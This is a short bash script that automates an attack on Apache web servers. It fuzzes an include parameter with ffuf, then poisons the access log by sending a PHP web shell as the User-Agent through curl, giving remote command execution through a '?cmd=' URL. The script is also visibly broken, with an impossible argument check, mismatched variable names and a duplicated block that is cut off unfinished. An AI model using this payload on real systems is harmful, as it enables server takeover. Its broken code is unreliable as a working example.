#!/bin/bash

arg1="$1"

show_help() {
	echo " Usage for scanning $0 <WORDLIST> <URL> <FS Filter>"
	echo " Usage for exploitation $0 <url_with_acces_log_reading>"
	echo " -h, --help display help"
	echo " url format: http://hello.com?page"
	echo " without the ="
	echo " this script work in apache "
}	

if [[ $arg1 == "-h" || $arg1 == "--help" ]]; then
	show_help
	exit 0
fi

if [ "$#" -ne 3 || "$#" -ne 1 ]; then
	echo " Error: missing argument"
	show_help
	exit 1 
fi

if [ "$#" -eq 3 ]; then
	wordlists="$1"
	url="$2"
	r="$3"
	
	ffuf -w "$wordlist" -u "$url=FUZZ" $r 
fi


if [ "$#" -eq 1 ]; then 
	v_url="$1"
	echo "<?php system($_GET['cmd']); ?>"
	read payload
	curl -A "$payload" \ "$v_url"
	echo " Your RCE ready"
	echo " $v_url?cmd= "
	
	ffuf -w "$wordlist" -u "$url=FUZZ" $r 
fi


if [ "$#" == 1 ]; then 
	v_url="$1"
	echo "<?php system($_GET['cmd']); ?>"
	read payload
	curl -A "$payload" \ "$v_url"
	echo " Your RCE ready"
	echo " $v_url?cmd= "
